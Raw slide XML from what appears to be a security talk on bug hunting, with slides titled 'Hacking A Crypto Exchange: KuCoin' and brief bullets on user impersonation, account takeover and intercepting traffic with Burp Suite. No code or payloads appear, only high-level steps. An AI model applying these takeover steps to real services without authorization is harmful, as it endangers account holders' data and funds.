              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Impersonate user (READ ONLY)</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Go to settings -&gt; Grab email/username</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Login</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Takeover the prison</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="449" name="Shape 449"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="450" name="Google Shape;450;p57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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1" name="Google Shape;451;p57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="452" name="Google Shape;452;p57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950325" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="453" name="Google Shape;453;p57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="454" name="Google Shape;454;p57"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1520938" y="1353551"/>
            <a:ext cx="6453864" cy="3321651"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="458" name="Shape 458"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459" name="Google Shape;459;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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0" name="Google Shape;460;p58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="461" name="Google Shape;461;p58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="1940700"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking a Crypto Exchange</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="465" name="Shape 465"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="466" name="Google Shape;466;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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7" name="Google Shape;467;p59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468" name="Google Shape;468;p59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469" name="Google Shape;469;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="470" name="Google Shape;470;p59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361500" y="1675100"/>
            <a:ext cx="6087375" cy="3122900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="474" name="Shape 474"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="475" name="Google Shape;475;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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6" name="Google Shape;476;p60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="477" name="Google Shape;477;p60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>KuCoin</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="478" name="Google Shape;478;p60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="479" name="Google Shape;479;p60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8398200" cy="1828500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-381000" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Proxy my browser traffic through Burp Suite.</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-381000" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Signed up to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2400" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>www.kucoin.com</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-381000" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Clicked through most of the application</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-381000" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Started going through Burp Suite history</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="483" name="Shape 483"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="484" name="Google Shape;484;p61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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5" name="Google Shape;485;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="486" name="Google Shape;486;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="18009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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Hacking A Crypto Exchange:</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
